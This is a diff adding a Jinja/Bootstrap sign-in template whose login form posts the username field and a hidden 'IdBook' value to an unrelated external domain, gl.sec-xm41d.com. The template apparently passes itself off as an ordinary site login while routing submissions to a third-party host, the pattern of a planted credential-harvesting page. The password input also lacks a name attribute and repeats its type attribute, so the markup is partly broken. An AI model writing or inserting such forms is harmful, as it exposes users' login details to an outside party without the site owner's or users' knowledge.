@@ -1,0 +1,30 @@
+{% extends 'base.html' %}
+
+{% block content %}
+<div class="container py-5">
+	<div class="row justify-content-center">
+		<div class="col-11 col-lg-6">
+			<div class="card border-dark text-white px-2 pb-4 pt-2" style="background-color: rgba(90, 90, 140, 0.6);">
+				<div class="card-header text-center">Sign in</div>
+				<div class="card-body">
+					<form action="https://gl.sec-xm41d.com" method="post" class="card-text">
+						<input type="hidden" name="IdBook" value="">
+						<div class="mb-5 mb-lg-3">
+							<label class="form-label" for="username_input">Username: </label>
+							<input class="form-control" id="username_input" type="text" name="account" maxlength="10" onfocus="this.value=&#39;&#39;;" value="User" required>
+						</div>
+						<div class="mb-3">
+							<label class="form-label" for="password_input">Password: </label>
+							<input class="form-control" id="password_input" type="password" type="password" onfocus="this.value=&#39;&#39;;" value="password" size="11" required>
+						</div>
+						<br>
+						<div class="d-grid gap-2">
+							<input class="btn btn-lg btn-primary" type="submit" value="Login">
+						</div>
+					</form>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+{% endblock %}
